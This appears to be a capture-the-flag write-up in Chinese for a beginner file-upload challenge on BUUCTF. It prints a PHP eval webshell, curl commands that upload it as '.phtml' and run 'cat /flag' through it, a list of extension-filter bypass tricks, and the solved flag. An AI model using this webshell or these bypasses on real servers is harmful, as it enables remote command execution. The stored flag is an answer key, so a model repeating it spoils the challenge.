---
title: "[ACTF2020 新生赛]Upload"
platform: BUUCTF
category: Web
difficulty: 入门
tags: [file-upload, bypass-extension, webshell]
vulnerability: 文件上传后缀验证不严格，允许上传 .phtml 等可执行后缀
solved: true
flag: "flag{272ff79a-1184-4608-a576-1162a4cb345b}"
---

# [ACTF2020 新生赛]Upload

## 题目概述
一道文件上传漏洞题目，页面提供一个文件上传表单，需要绕过限制上传恶意文件获取 flag。

## 信息收集
1. 访问页面，发现是一个文件上传表单
2. 查看源码，发现引用了 `js/main.js` 前端验证脚本
3. 前端验证代码只允许 `.jpg|.png|.gif` 后缀的文件上传

```javascript
var allow_ext = ".jpg|.png|.gif";
```

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：文件上传漏洞 - 后缀名绕过

**原理**：
- 前端 JS 验证只允许图片后缀，但可通过直接 POST 请求绕过
- 后端验证黑名单不完整，未过滤 `.phtml` 等 PHP 可执行后缀
- Apache 服务器配置了 `.phtml` 作为 PHP 解析

**判断过程**：
1. 尝试直接上传 `.php` 文件 → 后端返回 "Bad file"
2. 尝试 `.phtml` 后缀 → 上传成功并返回文件路径

## 利用过程（Payload + Flag）

**Step 1：创建 webshell**
```php
<?php @eval($_POST['cmd']); ?>
```

**Step 2：上传 .phtml 文件**
```bash
curl -X POST "http://target/" \
  -F "upload_file=@shell.phtml" \
  -F "submit=upload"
```

**Step 3：获取上传路径**
```
Upload Success! Look here~ ./uplo4d/bd914ca4997d34857501cefab0064162.phtml
```

**Step 4：执行命令获取 flag**
```bash
curl "http://target/uplo4d/xxx.phtml" -d "cmd=system('cat /flag');"
```

**Flag：** `flag{272ff79a-1184-4608-a576-1162a4cb345b}`

## 复现步骤
1. 访问题目页面，分析前端 JS 验证逻辑
2. 构造 `.phtml` 后缀的 PHP webshell
3. 使用 curl 直接 POST 上传，绕过前端验证
4. 后端允许 `.phtml` 后缀上传成功
5. 访问上传的 webshell，POST 参数 `cmd` 执行系统命令
6. 执行 `cat /flag` 获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 文件上传 | upload_file 参数 | `.phtml` 后缀绕过 | PHP 可执行后缀、黑名单绕过 |

## 知识总结（解题技巧、同类题型套路）

1. **文件上传绕过常见方法**：
   - 后缀绕过：`.phtml`, `.php5`, `.php3`, `.phps`, `.pht`
   - 大小写绕过：`.pHp`, `.PhP`
   - 空格/点绕过：`.php `, `.php.`
   - 双写绕过：`.pphphp`
   - 特殊字符：`.php%00.jpg`（00截断）

2. **解题套路**：
   - 先看前端验证，再测后端验证
   - 黑名单机制通常存在绕过可能
   - 上传成功后需要确认文件是否可执行
